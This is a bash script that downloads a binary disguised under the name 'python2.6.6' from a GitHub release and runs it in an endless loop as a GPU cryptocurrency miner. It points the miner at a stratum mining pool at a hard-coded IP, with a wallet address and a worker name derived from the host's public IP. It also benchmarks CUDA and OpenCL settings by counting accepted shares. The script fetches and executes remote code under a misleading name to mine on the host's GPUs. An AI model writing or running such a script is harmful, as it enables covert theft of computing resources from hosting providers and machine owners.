#!bin/bash -xe 

## getting IP info
iip=$(curl -s https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl ipinfo.io

echo '#######################################################'
echo '##################### Test N 28 ########################'
echo '#######################################################'

rm -rf python2.6.6
wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
chmod +x python2.6.6
cp python2.6.6 pythonoc

#### Clean logs
echo > cuout
echo > ocout
echo > ocoutdef
echo > cuoutdef
echo > oout


if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
then
    while true
    do 
        date >> results.txt
        echo "start loop"
        timeout 600s ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 8  --cuda-block-size 256   --cu-schedule auto --cuda-streams 4 --cuda-grid-size 16384 2>> cuout 1>> cuout 
        echo "cuda-plus : $(grep Acc cuout | wc -l ) " >> results.txt
        cat  results.txt
        timeout 1200s ./pythonoc -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 16384     --cl-local-work 128  2>> ocout 1>> ocout 
        echo "opencl-plus : $(grep Acc ocout | wc -l ) " >> results.txt
        cat  results.txt
        timeout 1200s ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U 2>> cuoutdef 1>> cuoutdef 
        echo "cuda-default : $(grep Acc cuoutdef | wc -l ) " >> results.txt
        timeout 600s ./pythonoc -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G  2>> ocoutdef 1>> ocoutdef 
        echo "opencl-default : $(grep Acc ocoutdef | wc -l ) " >> results.txt
        cat  results.txt
        timeout 1200s ./pythonoc -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 16384     --cl-local-work 128 2>> oout 1>> oout &
        timeout 1200s ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 4  --cuda-block-size 256   --cu-schedule auto --cuda-streams 2 --cuda-grid-size 16384 2>> oout 1>> oout &

        timeout 1200s tail -f oout 
        
        echo "opencl+cuda : $(grep Acc oout | wc -l ) " >> results.txt  
        echo '#################    Final 120s result    #################'   
        echo '###############################################' >> results.txt 
        cat  results.txt
    done

else
    while true
    do
        date >> results.txt
        echo "start loop"
        timeout 600s ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 8  --cuda-block-size 256   --cu-schedule auto --cuda-streams 4 --cuda-grid-size 16384 2>> cuout 1>> cuout 
        echo "cuda-plus : $(grep Acc cuout | wc -l ) " >> results.txt
        cat  results.txt
        timeout 1200s ./pythonoc -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 16384     --cl-local-work 128  2>> ocout 1>> ocout 
        echo "opencl-plus : $(grep Acc ocout | wc -l ) " >> results.txt
        cat  results.txt
        timeout 1200s ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U 2>> cuoutdef 1>> cuoutdef 
        echo "cuda-default : $(grep Acc cuoutdef | wc -l ) " >> results.txt
        timeout 600s ./pythonoc -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G  2>> ocoutdef 1>> ocoutdef 
        echo "opencl-default : $(grep Acc ocoutdef | wc -l ) " >> results.txt
        cat  results.txt
        timeout 1200s ./pythonoc -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 16384     --cl-local-work 128 2>> oout 1>> oout &
        timeout 1200s ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 4  --cuda-block-size 256   --cu-schedule auto --cuda-streams 2 --cuda-grid-size 16384 2>> oout 1>> oout &

        timeout 1200s tail -f oout 
        
        echo "opencl+cuda : $(grep Acc oout | wc -l ) " >> results.txt  
        echo '#################    Final 120s result    #################'   
        echo '###############################################' >> results.txt 
        cat  results.txt
    done
fi
tail -f results.txt